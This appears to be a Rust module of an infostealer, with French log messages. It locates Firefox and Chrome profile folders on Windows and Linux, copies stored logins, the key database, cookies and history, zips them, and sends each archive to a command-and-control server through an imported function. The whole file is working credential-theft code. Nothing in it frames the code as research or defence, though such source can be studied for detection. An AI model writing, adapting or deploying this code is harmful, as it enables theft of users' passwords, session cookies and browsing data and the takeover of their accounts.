use crate::connexion::{send_zip_to_c2, zip_dir};
use anyhow::{Ok, Result};
use chrono::prelude::*;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use tempfile::TempDir;

#[cfg(target_os = "windows")]
fn find_firefox_profile() -> Option<PathBuf> {
    let roaming = env::var("APPDATA").ok()?;
    let profiles_path = Path::new(&roaming).join("Mozilla\\Firefox\\Profiles");
    println!("Chemin de profils Firefox : {}", profiles_path.display());

    let mut default_profiles = vec![];

    for entry in fs::read_dir(&profiles_path).ok()? {
        let path = entry.ok()?.path();
        if path.is_dir() {
            let name = path.file_name()?.to_string_lossy();
            if name.contains("default-release") {
                return Some(path);
            } else if name.contains("default") {
                default_profiles.push(path);
            }
        }
    }

    default_profiles.into_iter().next()
}

#[cfg(target_os = "linux")]
fn find_firefox_profile() -> Option<PathBuf> {
    let home = env::var("HOME").ok()?;
    let profiles_path = Path::new(&home).join(".mozilla/firefox");
    for entry in profiles_path.read_dir().ok()? {
        let path = entry.ok()?.path();
        if path.is_dir() && path.to_string_lossy().contains("default") {
            return Some(path);
        }
    }
    None
}

#[cfg(target_os = "windows")]
fn find_chrome_profile() -> Option<PathBuf> {
    let local = env::var("LOCALAPPDATA").ok()?;
    let path = Path::new(&local).join("Google\\Chrome\\User Data\\Default");
    if path.exists() {
        Some(path)
    } else {
        None
    }
}

#[cfg(target_os = "linux")]
fn find_chrome_profile() -> Option<PathBuf> {
    let home = env::var("HOME").ok()?;
    let path = Path::new(&home).join(".config/google-chrome/Default");
    if path.exists() {
        Some(path)
    } else {
        None
    }
}

fn copy_files(profile_path: &Path, files: &[&str], subfolder: &str) -> Result<TempDir> {
    let temp_dir = TempDir::new()?;
    let target_dir = temp_dir.path().join(subfolder);
    fs::create_dir_all(&target_dir)?;

    for filename in files {
        let src = profile_path.join(filename);
        if src.exists() {
            let dest = target_dir.join(filename);
            fs::copy(&src, &dest)?;
        } else {
            eprintln!("Fichier non trouvé : {}", filename);
        }
    }

    Ok(temp_dir)
}

pub async fn process_browser_profiles() -> Result<()> {
    let utc: DateTime<Utc> = Utc::now();
    let timestamp = utc.format("%d-%m-%Y_%H-%M-%S").to_string();

    if let Some(profile_path) = find_firefox_profile() {
        println!("Profil Firefox trouvé : {}", profile_path.display());

        let firefox_files = [
            "logins.json",
            "key4.db",
            "places.sqlite",
            "cookies.sqlite",
            "pkcs11.txt",
        ];

        let foldername = format!("firefox_{}", timestamp);

        let temp_dir = copy_files(&profile_path, &firefox_files, &foldername)?;
        let zip_tempfile = zip_dir(temp_dir.path()).await?;
        println!("Fichiers Firefox zippés.");
        if let Err(e) = send_zip_to_c2(zip_tempfile.path()).await {
            eprintln!("Erreur lors de l'envoi du zip {}", e)
        }
    } else {
        eprintln!("Profil Firefox non trouvé.");
    }

    if let Some(profile_path) = find_chrome_profile() {
        println!("Profil Chrome trouvé : {}", profile_path.display());

        let chrome_files = [
            "Login Data",
            "Cookies",
            "History",
            "Bookmarks",
            "Preferences",
        ];

        let foldername = format!("chrome_{}", timestamp);

        let temp_dir = copy_files(&profile_path, &chrome_files, &foldername)?;
        let zip_tempfile = zip_dir(temp_dir.path()).await?;
        println!("Fichiers Chrome zippés.");
        if let Err(e) = send_zip_to_c2(zip_tempfile.path()).await {
            eprintln!("Erreur lors de l'envoi du zip {}", e)
        }
    } else {
        eprintln!("Profil Chrome non trouvé.");
    }

    Ok(())
}
